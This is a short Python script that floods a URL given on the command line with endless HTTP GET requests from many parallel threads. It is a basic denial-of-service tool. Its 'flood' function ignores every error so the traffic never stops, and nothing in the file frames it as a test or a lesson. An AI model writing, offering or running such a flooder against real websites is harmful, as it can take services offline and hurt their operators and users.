import threading
import requests
import sys

if len(sys.argv) != 3:
    print("Usage: python3 script.py <URL> <threads_count>")
    sys.exit(1)

target_url = sys.argv[1]
threads_count = int(sys.argv[2])

def flood():
    while True:
        try:
            requests.get(target_url, timeout=2)
        except:
            pass

threads = []
for _ in range(threads_count):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)

try:
    while True:
        pass
except KeyboardInterrupt:
    print("Stopped.")
